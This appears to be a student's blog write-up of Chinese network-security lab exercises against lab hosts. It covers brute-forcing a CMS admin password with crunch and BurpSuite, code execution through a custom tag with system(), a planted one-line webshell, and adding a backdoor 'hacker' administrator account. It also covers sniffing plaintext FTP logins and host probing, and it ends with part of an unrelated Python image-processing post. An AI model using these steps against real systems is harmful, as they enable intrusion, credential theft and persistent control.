<p>2.2在目标机的/root/目录下创建password.txt字典文件，生成字典文件的目的是为了暴力破解做准备，为了让生成的密码字典可能包含真正的密码，我们一般需要提前做一些社工工作，根据常人使用弱口令的习惯生成字典文件，例如：用户名为admin,则：密码可能为admin加3-5位数字的字符串。暴力破解是一个比较耗时的操作，本次实验只是为了教学使用。因此大家可以尝试使用crunch命令，生成一个每行以admin开头加3位随机数字共8位字符串长度的字典文件。</p>
<blockquote>
<p>提示：可以使用Kali linux集成的crunch工具来完成【操作步骤】2.2，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crunch 8 8 /rrot/password.txt -t admin%%%</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529114727202.png" alt="image-20200529114727202"></p>
<p>2.3在操作机中使用Firefox浏览器访问目标网站。通过以下链接打开后台管理界面：<code>http://192.168.1.4/admin/login.php</code>。在登录窗口中输入用户名和密码信息，用户名：admin，密码：123456。</p>
<p>2.4使用Firefox浏览器工具栏中的“设置”工具进行“Manual Proxy”配置，配置信息如图所示。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">about:preferences#advanced</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529120324890.png" alt="image-20200529120324890"></p>
<p>2.5在操作机中打开burpsuit软件，同时在目标机网站登录对话框中，单击“Submit”按钮，登录网站后台，这时burpsuit将截取发送的数据包。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529121231754.png" alt="image-20200529121231754"></p>
<p>2.6 在BurpSuite操作窗口中，查看截取到的目标机登录用户名和密码信息，操作画面如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529121354225.png" alt="image-20200529121354225"></p>
<p>2.7对password字段进行暴力破解，并提交破解的登录密码password的值。</p>
<blockquote>
<p>提示：可以使用BurpSuite工具来完成对目标网站用户admin登录密码的破解，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<blockquote>
<p>注意：使用burpsuit工具进行密码破解时，由于使用了请求重定向技术，请求都将被代理到burpsuit。也正是因为请求被代理，所以将产生临时性网页无法正常打开、进入等待状态的现象。密码破解成功后取消代理即可恢复正常，正常打开所需网页。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529121636111.png" alt="image-20200529121636111"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123054298.png" alt="image-20200529123054298"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123704550.png" alt="image-20200529123704550"></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123808639.png" alt="image-20200529123808639"></p>
<h3 id="【实验结果】-5"><a href="#【实验结果】-5" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将破解的admin登录密码作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529123724462.png" alt="image-20200529123724462"></p>
<h2 id="任务三获取webshell权限并拿到目标机开放的远程桌面端口号"><a href="#任务三获取webshell权限并拿到目标机开放的远程桌面端口号" class="headerlink" title="任务三获取webshell权限并拿到目标机开放的远程桌面端口号"></a>任务三获取webshell权限并拿到目标机开放的远程桌面端口号</h2><h3 id="【任务描述】-4"><a href="#【任务描述】-4" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务二操作完成的基础上，上传目标机网站的webshell,然后利用获取的网站webshell权限，查看目标主机信息,提交目标主机远程桌面端口号，为下一任务添加用户，完全控制目标主机系统做环境准备。</p>
<p>通过完成本实验任务，要求学生理解webshell的概念，掌握webshell上传方法，以及通过webshell查看目标机信息的方法。</p>
<h3 id="【实验目标】-6"><a href="#【实验目标】-6" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>熟悉网站wenshell的概念，理解上传webshell、获取webshell权限的意义和方法。</li>
<li>掌握通过网站webshell信息获取其用户及密码信息的方法。</li>
<li>掌握通过webshell查看目标机关键信息的方法。</li>
</ul>
<h3 id="【实验工具】-5"><a href="#【实验工具】-5" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p>Firefox（火狐浏览器）</p>
<h3 id="【操作步骤】-4"><a href="#【操作步骤】-4" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>3.1在任务二的实验基础上，使用破解的管理员用户信息登录目标机网站后台，用户名：admin，密码：admin452。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529194505404.png" alt="image-20200529194505404"></p>
<p>3.2登录目标机网站后台后，设置用户自定义标记（Add User Defined Tag），配置信息为name：“hacker”，code：“system(“whoami”);”，如图3-1所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529124144298.png" alt="image-20200529124144298"></p>
<p>输入<code>hacker，system(&quot;whoami&quot;);</code>，提交</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529124232644.png" alt="image-20200529124232644"></p>
<p>点击新添加的tags：hacker</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529194649256.png" alt="image-20200529194649256"></p>
<p>然后点击<code>RUN</code>，系统返回执行结果。可以看到页面输出了以下内容，我们获取了root用户权限。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529124447025.png" alt="image-20200529124447025"></p>
<p>3.3在如图3-1所示画面中的code区域，尝试设置不同的system()函数命令参数，并执行相应命令，最终获取目标网站webshell提权。在浏览器地址栏中输入“ <code>http://192.168.1.4/1.php?m=system(“whoami”);</code>” ，执行命令“whoami”,显示webshell权限，如图所示。</p>
<p>通过触发一个错误，我们可以看到，当前路径名，这样我们就可以把木马文件植入到这个目录下了。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529195532320.png" alt="image-20200529195532320"></p>
<p>我们可以利用这个code区，上传一句话木马文件。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529200533653.png" alt="image-20200529200533653"></p>
<p>RUN执行，可以得到如下结果</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529201058479.png" alt="image-20200529201058479"></p>
<p>3.4 接下来我们就可以利用上传的一句话木马执行命令，查找目标主机开放的远程桌面端口了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.1.4/1.php？c=system("tasklist -svc");</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529202243911.png" alt="image-20200529202243911"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.1.4/1.php？c=system("netstat -ano");</span><br><span class="line">发现这个程序的端口号为45565</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529202214286.png" alt="image-20200529202214286"></p>
<h3 id="【实验结果】-6"><a href="#【实验结果】-6" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将探测到的目标机开放的远程桌面端口作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529202501393.png" alt="image-20200529202501393"></p>
<h2 id="任务四-向目标机添加新用户并控制目标机"><a href="#任务四-向目标机添加新用户并控制目标机" class="headerlink" title="任务四 向目标机添加新用户并控制目标机"></a>任务四 向目标机添加新用户并控制目标机</h2><h3 id="【任务描述】-5"><a href="#【任务描述】-5" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务三操作完成的基础上，向目标机添加新用户，并完全控制目标主机系统。</p>
<p>通过完成本实验任务，要求学生在掌握webshell上传及权限获取方法的基础上，掌握向目标机添加新用户，设置用户权限并实现目标机控制的方法，进而掌握企业级复杂网络webshell相关的高级漏洞挖掘和利用方法，具备高级漏洞挖掘和利用、信息系统安全管理的职业能力。</p>
<h3 id="【实验目标】-7"><a href="#【实验目标】-7" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>理解webshell权限获取的意义和方法。</li>
<li>掌握获取webshell权限基础上控制目标机的方法。</li>
<li>掌握企业级复杂网络漏洞挖掘和利用方法。</li>
</ul>
<p>具备高级漏洞挖掘和利用职业能力。</p>
<h3 id="【实验工具】-6"><a href="#【实验工具】-6" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p>Firefox（火狐浏览器）</p>
<h3 id="【操作步骤】-5"><a href="#【操作步骤】-5" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p><strong>4.1</strong>向目标机网站（http：//192.168.1.4）添加新用户，用户名：hacker，密码：Beijing123。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user hacker Beijing123 /add</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204023388.png" alt="image-20200529204023388"></p>
<p><strong>4.2</strong>把hacker用户添加到管理员组，并远程连接目标机，远程连接的时候注意远程连接的端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators hacker /add</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204433906.png" alt="image-20200529204433906"></p>
<p><strong>4.3</strong>以hacker用户（用户名：hacker、密码：Beijing123）身份登录目标机系统。</p>
<p>（提示：可使用工具rdesktop远程连接目标机，远程连接端口可通过在浏览器中使用system()函数执行相关命令来获得）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rdesktop -a 16 192.168.1.4:45565 #端口与第一题不一样</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204949002.png" alt="image-20200529204949002"></p>
<p><strong>4.4</strong>设置目标机C:\2.key文件的可读权限，并查看该文件的具体内容。</p>
<p>设置权限——完全控制</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204924371.png" alt="image-20200529204924371"></p>
<p>最终得到结果：<code>Zenmap</code></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204908952.png" alt="image-20200529204908952"></p>
<h3 id="【实验结果】-7"><a href="#【实验结果】-7" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将探测到的目标机上key2.txt文件的内容作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529205234362.png" alt="image-20200529205234362"></p>
<h1 id="1-3-FTP连接与密码明文抓取-wireshark"><a href="#1-3-FTP连接与密码明文抓取-wireshark" class="headerlink" title="1.3 FTP连接与密码明文抓取-wireshark"></a>1.3 FTP连接与密码明文抓取-wireshark</h1><h2 id="【实验目的】-1"><a href="#【实验目的】-1" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><ul>
<li>掌握数据嗅探的原理</li>
<li>了解协议封装的过程</li>
<li>掌握典型的嗅探工具的使用</li>
</ul>
<h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>FTP 是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念： 下载 （Download）和 上传 （Upload）。 下载 文件就是从远程主机拷贝文件至自己的计算机上； 上传 文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。</p>
<p>Wireshark（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。</p>
<h2 id="【实验工具】-7"><a href="#【实验工具】-7" class="headerlink" title="【实验工具】"></a>【实验工具】</h2><p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523183735541.png" alt="image-20200523183735541"></p>
<p>目标机：192.168.1.3<br>工具：<code>C:\实验工具集\06_网络与无线安全\02_嗅探与欺骗</code></p>
<h2 id="【操作步骤】-6"><a href="#【操作步骤】-6" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h2><p><strong>一、设置wireshark抓包参数</strong></p>
<p>1.1 打开” <code>C:\实验工具集\06_网络与无线安全\02_嗅探与欺骗\第1节 FTP连接与密码明文抓取-wireshark</code>”目录下的WireShark。</p>
<p>1.2 在Capture菜单项中设置抓包的相关参数。</p>
<p>1.3    选择Interfaces…选项，对话框显示可操作的网络适配器。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185215942.png" alt="image-20200523185215942"></p>
<p>1.4    通过Options选项，设置如抓包模式、过滤器、数据包限制字节、存档文件模式、停止规则、名字解析等参数，设置完毕，即可开始捕获网络数据包。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185338662.png" alt="image-20200523185338662"></p>
<p><strong>二、Wireshark下数据包的解析</strong></p>
<p>2.1 首先介绍一下网络结构。网络结构可以分为4层，每层都有不同的功能，由不同的协议组成。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185402160.png" alt="image-20200523185402160"></p>
<p>2.2 EthernetII的帧结构为目的MAC地址+源MAC地址+上层协议类型+数据字段+校验。WireShark利用树形结构显示的协议。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185911287.png" alt="image-20200523185911287"></p>
<p>2.3    第一行为WireShark添加、该帧的相关统计信息。包括捕获时间、编号、帧长度、帧中所含有的协议等。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185833495.png" alt="image-20200523185833495"></p>
<p>2.4    第二行为链路层信息，包括目的MAC地址、源MAC地址、上层协议类型。如图所示。<img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185954122.png" alt="image-20200523185954122"></p>
<p>2.5 第三行为网络层信息，如此处为IP协议。细节包括版本、头部长度、总长度、标志位、源/目的IP地址、上层协议等。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523190010259.png" alt="image-20200523190010259"></p>
<p>2.6 第四行为传输层信息，包括源/目的端口、序列号、期望的下个序列号、确认号、头部长度、标志位、窗口长度、校验和等。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523190028326.png" alt="image-20200523190028326"></p>
<p>2.7    第五行为应用层信息，内容由具体的应用层协议决定，此处为FTP协议，显示的是响应内容。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523190532347.png" alt="image-20200523190532347"></p>
<p><strong>三、连接建立</strong></p>
<p>3.1打开” <code>C:\实验工具集\06_网络与无线安全\02_嗅探与欺骗\第1节 FTP连接与密码明文抓取-wireshark</code>”目下下的wireshark软件。</p>
<p>3.2单击“start”按钮，开始抓包。如图所示</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523191340943.png" alt="image-20200523191340943"></p>
<p>3.3  打开我的电脑或者资源管理器，在地址栏中输入“ftp:\\192.168.1.3”,默认帐号（test）和密码(123456)。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523191601668.png" alt="image-20200523191601668"></p>
<p>3.4认证成功后。</p>
<p>3.5在wireshark界面中，找到登陆的帐号（test）和密码(123456)</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523191654768.png" alt="image-20200523191654768"></p>
<h2 id="【实验结果】-8"><a href="#【实验结果】-8" class="headerlink" title="【实验结果】"></a>【实验结果】</h2><p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523192948988.png" alt="image-20200523192948988"></p>
<h1 id="1-4-kali主机探测命令与工具集"><a href="#1-4-kali主机探测命令与工具集" class="headerlink" title="1.4 kali主机探测命令与工具集"></a>1.4 kali主机探测命令与工具集</h1><h2 id="【实验目的】-2"><a href="#【实验目的】-2" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>熟悉ping、arping、fping、hping3、nbtscan、nping、p0f、xprobe2工具对目标主机的探测方法。</p>
<h2 id="【实验原理】-1"><a href="#【实验原理】-1" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>目标识别工具发送特殊构造的数据包，根据返回的应答数据包猜测出目标的端口开放和服务开放情况。</p>
<h2 id="【实验环境】-1"><a href="#【实验环境】-1" class="headerlink" title="【实验环境】"></a>【实验环境】</h2><p>Kali操作系统</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523195226289.png" alt="image-20200523195226289"></p>
<h2 id="【实验步骤】-2"><a href="#【实验步骤】-2" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><p><strong>一、探测工具</strong></p>
<p>1.1 <strong>ping</strong>检查主机是否在线的工具。发送ICMP ECHO REQUEST包到目标主机，如果目标主机在线井且不堵塞ping请求，将回复ICMP ECHO REPLY包。单击桌面，右键菜单选择“在终端中打开”。<br>命令选项：</p>
<ul>
<li>c count, ECHO_REQUEST包发进数量。</li>
<li>i interface address：源地址网络接口。该参数可以是lP地址或网卡名称。</li>
<li>s packetfsize；指定要发送的数据字节数。默认值是56，然后再与8字节的ICMP头数据组台成64字节的ICMP数据</li>
</ul>
<p>1.2 在终端中输入命令“<code>ping –c 5 –s 2000 192.168.1.3</code>”，发送5个大小为2000字节的数据包。注意：发送2000字节的数据包在当前环境下过大，有可能会造成发送失败，所以在做实验的过程中如果出现这个问题，将数值改小一点即可。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524083529309.png" alt="image-20200524083529309"></p>
<p>1.3 <strong>arping</strong>是一个在LAN中使用ARP地址解析协议发现目标主机的工具。arping工具测试特定IP地址在网络中是否在线。该命令只能运行本地局域网内，无法跨越路由器和网关，常用的选项为<code>apring –c</code>，在终端中输入命令“<code>arping –c 4 192.168.1.3</code>”，发送四个ping数据包到目标主机。如图所示</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524083636078.png" alt="image-20200524083636078"></p>
<p>1.4 <strong>fping</strong>命令同时向多个主机发送ping (ICMP ECHO)请求，fping通过监视目标主机的回复来判断主机<strong>是否可用</strong>。如果目标主机发送回应将会从目标记录清单中删除，如果目标主机不响应，该主机将会被标记为不可达。默认情况下，fping将尝试向每个目标发送三个ICMP ECHO包。如图所示。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.3 is alive</span><br><span class="line">192.168.1.4 is unreachable</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524083916126.png" alt="image-20200524083916126"></p>
<p>1.5在终端中输入命令“<strong>hping3</strong>”回车后可以打开Tcl脚本交互式界面。向目标主机192.168.1.3发送一个icmp echo request请求数据包。在终端中输入命令“<code>hping send {ip(daddr=192.168.1.3)+icmp(type=0,code=0)}</code>”，即发送ping应答，然后再输入命令“<code>hping recv eth0</code>”用户监听返回的数据包。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085035752.png" alt="image-20200524085035752"></p>
<p>1.6 <strong>nbtscan</strong> 通过扫描lP地址获取目标NetBIOS名字信息的工具，生成包含对应主机IP地址、NetBIOS计算机名、可用服务、登录用户名和MAC地址的报告，在终端中输入命令“<code>nbtscan 192.168.1.3</code>”查看目标主机的NETBIOS信息。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085129930.png" alt="image-20200524085129930"></p>
<p>1.7 在终端中输入“<code>nbtscan –hv 192.168.1.3</code>”, 参数-hv查看目标主机运行服务。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085247858.png" alt="image-20200524085247858"></p>
<p>1.8  <strong>nping</strong>支持多协议（TCP、UDP、ICMP、ARP)，且允许用户设置网络报文格式的探测工具，可以自定义协议头中的字段，在终端中输入命令“<code>nping -c 2 --tcp -p 80 --flags syn 192.168.1.3</code>”，向目标主机80端口发送带SYN标志的TCP数据包2个。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085419395.png" alt="image-20200524085419395"></p>
<p><strong>二、系统识别</strong></p>
<p>2.1 <strong>p0f</strong>是用被动方式探测目标主机操作系统类型的工具，在命令终端中输入命令“<code>p0f –o /root/p0f.log</code>“,把登录信息保存到p0f.log文件中。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085714665.png" alt="image-20200524085714665"></p>
<p>2.2在打开另外一个终端，在终端中输入命令“<code>ftp 192.168.1.3</code>”. 登录目标主机的FTP服务器(用户名:administrator、密码：Simplexue123)。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085900431.png" alt="image-20200524085900431"></p>
<p>2.3在终端中输入命令“<code>cat /root/p0f.log</code>”,查看探测结果，显示没有成功探测出系统类型(理论上可以弹出目标系统类型,建议换其它目标主机测试)。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524091301005.png" alt="image-20200524091301005"></p>
<p>2.4 <strong>xprobe2</strong>是一个主动的操作系统识别工具。其通过模糊签名匹配、可能性猜测、同时多匹配和签名数据库来识别操作系统。在终端下输入命令“<code>xprobe2 192.168.1.3</code>”探测目标主机操作系统类型，从探测信息看，只探测出是windows系统，具体版本并没有判断正确。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524090714364.png" alt="image-20200524090714364"></p>
<p>扫描出来是Server 2000，目标机是Server 2003，扫描判断错误</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524091104582.png" alt="image-20200524091104582"></p>
<h2 id="【实验思考】"><a href="#【实验思考】" class="headerlink" title="【实验思考】"></a>【实验思考】</h2><p>1.实验中是否探测出目标系统的版本,如果没有，请问如何使探测更加准确?</p>
<p>答：</p>
<p>扫描tcp(-T)中的20，21，22和udp(-U)中的53，67 端口,猜想操作系统。（更进一步，可以提供更多的开放端口以提高准确性）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xprobe2 -T 20,21,22 -U 53,67 192.168.1.3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524091838690.png" alt="image-20200524091838690"></p>
<p>2.</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524092045616.png" alt="image-20200524092045616"></p>
<h1 id="实验心得与总结"><a href="#实验心得与总结" class="headerlink" title="实验心得与总结"></a>实验心得与总结</h1><ul>
<li>本次实验实践了简单的网络侦察、漏洞挖掘以及FTP明文抓取、kali主机探测等，学习到了很多有用的命令。并且在网络侦察、漏洞挖掘实验中学习了简单的入侵实验。</li>
<li>实验的容量还是很大的（光是网络侦察实验就够劝退人了啊喂。。），但也因此学习到了很多东西（一颗坚毅的心）。对入侵的操作、一句话木马、抓包、漏洞挖掘等，都进行了熟悉。</li>
<li>这部分的工具和思想对我们的日常工作是很有帮助的，并且这些都是后面进行网络渗透的基础，需要认真学习掌握。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>信安内容实验3</title>
    <url>/2020/05/03/2020-05-03-information-security-exp-3/</url>
    <content><![CDATA[<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200505202005599.png" alt="image-20200505202005599"></p>
<a id="more"></a>

<p>[TOC]</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>IDE：pycharm</p>
<p>python版本：anacoda-&gt;python3.7</p>
<h1 id="1、图像实验"><a href="#1、图像实验" class="headerlink" title="1、图像实验"></a>1、图像实验</h1><h2 id="1-1-背景介绍"><a href="#1-1-背景介绍" class="headerlink" title="1.1 背景介绍"></a>1.1 背景介绍</h2><p>本次实验，主要熟悉图像的python库操作，仿射变换的学习，以及图像的基本聚类分类方法。</p>
<h3 id="（1）图像的基本知识"><a href="#（1）图像的基本知识" class="headerlink" title="（1）图像的基本知识"></a>（1）图像的基本知识</h3><p>通常情况下，计算机中图像是一个三维数组，维度分别是高度、宽度和像素RGB值。</p>
<p>RGB色彩模式，即每个像素点的颜色由红(R)、绿(G)、蓝(B)组成，RGB三个颜色通道的变化和叠加得到各种颜色，其中每个通道值为0~255。</p>
<h3 id="（2）库介绍"><a href="#（2）库介绍" class="headerlink" title="（2）库介绍"></a>（2）库介绍</h3><ul>
<li><p>NumPy是一个开源的Python科学计算基础库。</p>
<p>N维数组对象：ndarray</p>
<ul>
<li>数组对象可以去掉<strong>元素间运算</strong>所需的循环，使一维向量更像单个数据</li>
<li>设置专门的数组对象，经过优化，可以提升这类应用的运算速度</li>
</ul>
</li>
<li><p>PIL库（Python Image Library）Python中图像处理最常用的库</p>
<p>PIL库是一个具有强大图像处理能力的第三方库。</p>
<p>PILLOW官方文档：<a href="https://pillow.readthedocs.io/en/latest/reference/Image.html" target="_blank" rel="noopener">https://pillow.readthedocs.io/en/latest/reference/Image.html</a></p>
<p>中文博客：<a href="http://blog.csdn.net/column/details/pythonpil.html?&amp;page=1" target="_blank" rel="noopener">http://blog.csdn.net/column/details/pythonpil.html?&amp;page=1</a></p>
</li>
<li><p>OpenCV：是计算机视觉领域应用最广泛的开源工具包。</p>
<p>基于C/C++，支持Linux/Windows/MacOS/Android/iOS，并提供了Python，Matlab和Java等语言的接口，因为其丰富的接口，优秀的性能和商业友好的使用许可，不管是学术界还是业界中都非常受欢迎。OpenCV旨在提供一个用于计算机视觉的科研和商业应用的高性能通用库。</p>
<p>Anaconda命令行安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda install --channel https:&#x2F;&#x2F;conda.anaconda.org&#x2F;menpo opencv3</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="3-图像的基本操作"><a href="#3-图像的基本操作" class="headerlink" title="(3)图像的基本操作"></a>(3)图像的基本操作</h3><p><strong>图像的表示</strong></p>
<h4 id="1-将彩色RGB图片变为黑白（灰度）图片"><a href="#1-将彩色RGB图片变为黑白（灰度）图片" class="headerlink" title="1.将彩色RGB图片变为黑白（灰度）图片"></a>1.将彩色RGB图片变为黑白（灰度）图片</h4><p>灰度转换公式：L = R * 299/1000 + G * 587/1000+ B * 114/1000</p>
<p>PIL中，灰度表示模式为L模式，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">'1.jpg'</span>)</span><br><span class="line">im_l = im.convert(<span class="string">"L"</span>)</span><br><span class="line">im_1.show()</span><br><span class="line">im_l.save(<span class="string">'output1.jpg’)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504174904801.png" alt="image-20200504174904801"></p>
<h4 id="2-将彩色RGB图片变为“底片”模式"><a href="#2-将彩色RGB图片变为“底片”模式" class="headerlink" title="2.将彩色RGB图片变为“底片”模式"></a>2.将彩色RGB图片变为“底片”模式</h4><p>PIL中，当需要更个性化的图片时，可配合使用numpy,对图像中的数据进行操作将原图以灰度打开后，取反码（b=255-a）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.array(Image.open(<span class="string">"1.jpg"</span>).convert(<span class="string">'L'</span>))</span><br><span class="line">b = <span class="number">255</span> - a</span><br><span class="line">im = Image.fromarray(b.astype(<span class="string">'uint8'</span>))</span><br><span class="line">im.save(<span class="string">"output3.jpg"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504174823310.png" alt="image-20200504174823310"></p>
<h4 id="3-滤波器提取图片的信息"><a href="#3-滤波器提取图片的信息" class="headerlink" title="3.滤波器提取图片的信息"></a>3.滤波器提取图片的信息</h4><p>PIL的ImageFilter模块提供了滤波器相关定义，这些滤波器主要用于Image类的filter()方法。</p>
<p>例如，提取图片的轮廓信息：使用ImageFilter.CONTOU</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFilter</span><br><span class="line">a = Image.open(<span class="string">'5.jpg'</span>)</span><br><span class="line">b = </span><br><span class="line">a.filter(ImageFilter.CONTOUR)</span><br><span class="line">b.save(<span class="string">"output5.jpg"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504174832839.png" alt="image-20200504174832839"></p>
